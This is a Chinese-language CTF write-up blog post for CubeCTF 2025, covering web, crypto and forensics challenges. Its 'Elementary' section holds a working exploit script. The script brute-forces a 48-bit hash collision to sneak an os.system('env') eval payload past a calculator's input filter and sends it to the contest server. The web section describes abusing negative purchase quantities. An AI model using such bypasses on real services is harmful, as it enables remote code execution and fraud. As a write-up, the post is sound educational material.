---
title: 2025 CubeCTF
publishDate: 2025-07-07
description: '队友之前就有转型国际联队的意愿，但Del0n1x毕竟是Academic Team所以这么做不太好。这次趁着CubeCTF拉了个国际联队，以便为未来组建Del0n1x国际版积累经验。'
image: 'assets/image.png'
tags: ['CTF', 'Crypto', 'Forensics', 'birthday attack']
category: 'Writeups'
draft: false 
lang: ''
---

说是国际联队其实就我一个在发力，加进来的其他几个人都爆零了xD

# Web
## Legal Snacks

页面进去后是个类似购物网站的东西，默认情况下的账户余额是\$100,你需要买到\$99999的东西才会给你flag。

虽然没有源码但是可以猜测后端在接收商品数量时没有校验是否非负，所以Burp抓包修改一下买负数个其他商品就可以增加账户余额，增加的多了就有钱买那个$99999的东西了。

# Crypto

## Elementary

```python title="chall.py"
#!/usr/bin/env python3

import re

validated = {}

def h(data: str) -> bytes:
    b = data.encode('utf-8')

    h1 = 0x1234567890ab
    h2 = 0xfedcba098765

    for i in range(len(b)):
        byte = b[i]
        shift = (i % 6) * 6

        if i % 2 == 0:
            h1 ^= (byte << shift)
            h1 = (h1 * 0x100000001b3) & 0xFFFFFFFFFFFF
        else:
            h2 ^= (byte << shift)
            h2 = (h2 * 0xc6a4a7935bd1) & 0xFFFFFFFFFFFF

    result = h1 ^ ((h2 << 24) | (h2 >> 24))
    result = (result ^ (result >> 25)) * 0xff51afd7ed55
    result &= 0xFFFFFFFFFFFFFFFF
    result = (result ^ (result >> 25)) * 0xc4ceb9fe1a85
    result &= 0xFFFFFFFFFFFFFFFF
    result ^= result >> 25

    return result.to_bytes(8, 'big')[:6]

def validate(data: str) -> bool:
    global validated
    if h(data) in validated:
        return True
    if not re.match(r'^[0-9 \+\-\/\*\.]+$', data):
        print("Invalid input. Only numbers and operators (+, -, /, *, .) are allowed.")
        return False
    validated[h(data)] = True
    return True

def main():
    print("Welcome to my elementary calculator!")
    while True:
        print()
        calc = input("Enter expression to calculate: ").strip()
        if not calc:
            print("Goodbye!")
            break

        if not calc in validated:
            if not validate(calc):
                continue

        try:
            print(eval(calc))
        except Exception as e:
            print(f"Hmm, I haven't learned that yet")


if __name__ == "__main__":
    try:
        main()
    except:
        print("\nGoodbye!")
```

自己实现了输出为48bit的hash函数，用生日攻击的思想会知道 $2^{24}$ 种输入就有很大概率会有collision了。还有个小小的PyJail，因为python语句后加注释不影响eval()所以可以在payload之后加个#，接着就能在后面随便pad东西了。

我这里是构造好payload之后在后面pad长度为28的空格和#交错的东西。注意，运行时使用PyPy而非CPython可以有效提高速率。(当然写个并行也可以，但我懒得写了)

```python title="solve.py"
import re
import itertools
import pickle
import os
from pwn import *
from tqdm import tqdm


HOST = "elementary.chal.cubectf.com"
PORT = 3456
LOOKUP_TABLE_FILE = "lookup_table.pkl"


def h(data: str) -> bytes:
   b = data.encode("utf-8")

   h1 = 0x1234567890AB
   h2 = 0xFEDCBA098765

   for i in range(len(b)):
       byte = b[i]
       shift = (i % 6) * 6

       if i % 2 == 0:
           h1 ^= byte << shift
           h1 = (h1 * 0x100000001B3) & 0xFFFFFFFFFFFF
       else:
           h2 ^= byte << shift
           h2 = (h2 * 0xC6A4A7935BD1) & 0xFFFFFFFFFFFF

   result = h1 ^ ((h2 << 24) | (h2 >> 24))
   result = (result ^ (result >> 25)) * 0xFF51AFD7ED55
   result &= 0xFFFFFFFFFFFFFFFF
   result = (result ^ (result >> 25)) * 0xC4CEB9FE1A85
   result &= 0xFFFFFFFFFFFFFFFF
   result ^= result >> 25

   return result.to_bytes(8, "big")[:6]


def find_collision():
   SEARCH_LIMIT = 2**24
   base_payload = "__import__('os').system('env')"
   lookup_table = {}

   if os.path.exists(LOOKUP_TABLE_FILE):
       print(f"[*] Loading lookup table from {LOOKUP_TABLE_FILE}...")
       with open(LOOKUP_TABLE_FILE, "rb") as f:
           lookup_table = pickle.load(f)
       print(f"[*] Loaded {len(lookup_table)} entries.")
   else:
       print(f"[*] Stage 1: Building lookup table with {SEARCH_LIMIT} valid strings...")
       for i in tqdm(range(SEARCH_LIMIT)):
           valid_string = f"1.{i}"
           lookup_table[h(valid_string)] = valid_string

       print(f"[*] Saving lookup table to {LOOKUP_TABLE_FILE}...")
       with open(LOOKUP_TABLE_FILE, "wb") as f:
           pickle.dump(lookup_table, f)

   print(
       f"[*] Stage 2: Searching for a collision..."
   )
   PADDING_LEN = 28
   PADDING_CHARS = [" ", "#"]
   payload_paddings = itertools.product(PADDING_CHARS, repeat=PADDING_LEN)
   for padding_tuple in tqdm(payload_paddings, total=2**PADDING_LEN):
       padding = "".join(padding_tuple)

       payload = base_payload + padding
       payload_hash = h(payload)

       if payload_hash in lookup_table and payload[-1] != " ":
           valid_string = lookup_table[payload_hash]
           print("\n[+] Collision Found!")
           print(f"  -> Valid String : '{valid_string}'")
           print(f"  -> Payload      : '{payload}'")
           print(f"  -> Common Hash  : {payload_hash.hex()}")
           return valid_string, payload

   print("\n[-] Collision not found within the search limit. Try increasing it.")
   return None, None


def main():
   valid_string, payload = find_collision()

   if not valid_string or not payload:
       return

   print(f"\n[*] Connecting to {HOST}:{PORT}")
   p = remote(HOST, PORT)

   p.recvuntil(b"Enter expression to calculate: ")

   print(f"[*] Sending valid string to prime the hash: '{valid_string}'")
   p.sendline(valid_string.encode())

   p.recvuntil(b"Enter expression to calculate: ")

   print(f"[*] Sending colliding payload to execute: '{payload[:30]}...'")
   p.sendline(payload.encode())

   print("[*] Receiving response...")
   response = p.recvall(timeout=2).decode()

   print("\n--- Server Response ---")
   print(response)
   print("-----------------------")

   flag = re.search(r"cube\{.*?\}", response)
   if flag:
       print(f"\n[+] Flag found: {flag.group(0)}")
   else:
       print("\n[-] Flag not found in the response.")

   p.close()


if __name__ == "__main__":
   main()
```

## Incantation

给了个加upx壳的二进制文件，脱掉之后其实就是个词频分析题。

不想贴附件，只贴个exp吧。

```python title="solve.py"
from collections import Counter
# nc [IP:PORT] > output.txt
with open('output.txt', 'r') as f:
   lines = f.read().strip().splitlines()

flag = ""
for column_chars in zip(*lines):
   most_common = Counter(column_chars).most_common(1)[0][0]
   flag += most_common

print(flag)
```

# Forensics

## Discord

给了个ad1后缀的磁盘镜像，要求从中恢复Discord聊天记录中的一张图。搜索得知可以用FTK Imager打开。注意打开时不要选择mounting image而要选择add evidence。

打开之后去桌面能看到一个Pyinstaller打包的encrypt.exe，解包逆一下发现它加密了Discord的cache文件夹。按对应逻辑恢复cache内容后写个脚本检查哪些是图片就行。exp是AI搓的。

```python title="solve.py"
# cache_image_extractor.py
# 用于从Discord缓存文件中提取图片

import os
import shutil
from pathlib import Path

# 定义不同图片格式的文件头 (Magic Numbers)
# 我们只需要读取文件的前几个字节来判断其类型
MAGIC_NUMBERS = {
    'jpg': b'\xFF\xD8\xFF',
    'png': b'\x89PNG\r\n\x1a\n',
    'gif': b'GIF8',
    # WebP比较特殊，"WEBP"标识符在文件偏移量8的位置
    'webp': b'WEBP' 
}

def extract_images():
    """
    主提取函数
    """
    print("--- Discord 缓存图片提取工具 ---")
    print("本工具会扫描指定的文件夹，识别图片文件，并将其复制到新的文件夹中。")
    print("-" * 35)

    # 1. 获取用户输入的路径
    source_dir_str = input("请输入已解密的缓存文件夹路径: ")
    source_dir = Path(source_dir_str)

    if not source_dir.is_dir():
        print(f"错误: 路径 '{source_dir}' 不是一个有效的文件夹。")
        return

    output_dir_str = input("请输入用于存放恢复图片的输出文件夹路径: ")
    output_dir = Path(output_dir_str)

    # 创建输出文件夹（如果不存在）
    output_dir.mkdir(exist_ok=True)
    print(f"图片将被保存到: {output_dir.resolve()}")

    # 2. 遍历文件并识别
    print("\n开始扫描和提取图片...")
    extracted_count = 0
    file_count = 0

    # 获取文件总数用于显示进度
    all_files = list(source_dir.iterdir())
    total_files = len(all_files)

    for i, file_path in enumerate(all_files):
        file_count += 1
        # 打印进度
        print(f"\r正在处理: {i+1}/{total_files} ({file_path.name})", end="")

        if not file_path.is_file():
            continue

        try:
            with open(file_path, 'rb') as f:
                # 读取文件的前16个字节，足够判断大多数类型
                header = f.read(16)

            file_type = None

            # 检查标准文件头
            for ext, magic in MAGIC_NUMBERS.items():
                # 特殊处理WebP
                if ext == 'webp':
                    # "RIFF"在开头, "WEBP"在偏移量8
                    if header.startswith(b'RIFF') and magic in header[8:12]:
                        file_type = ext
                        break
                elif header.startswith(magic):
                    file_type = ext
                    break
            
            # 如果识别出了图片类型
            if file_type:
                # 构建新的文件名和路径
                new_filename = f"{file_path.name}.{file_type}"
                destination_path = output_dir / new_filename

                # 复制文件到输出目录
                shutil.copy2(file_path, destination_path)
                extracted_count += 1

        except (IOError, PermissionError) as e:
            # 忽略无法读取的文件
            # print(f"\n无法读取文件 {file_path.name}: {e}")
            continue

    print("\n\n--- 提取完成 ---")
    print(f"总共扫描了 {total_files} 个文件。")
    print(f"成功提取并恢复了 {extracted_count} 张图片。")
    print(f"请到 '{output_dir.resolve()}' 文件夹查看结果。")


if __name__ == '__main__':
    extract_images()
```

## Operator

流量包，能看出运行了个二进制文件监听端口，然后往这个端口传了点数据。二进制文件也可以在流量包里找到，拖出来逆向发现就是监听端口然后把接收到的数据和固定的key做xor而已，所以可以推测传输的那点数据就是加密后的密文，提取出来xor回去就行。

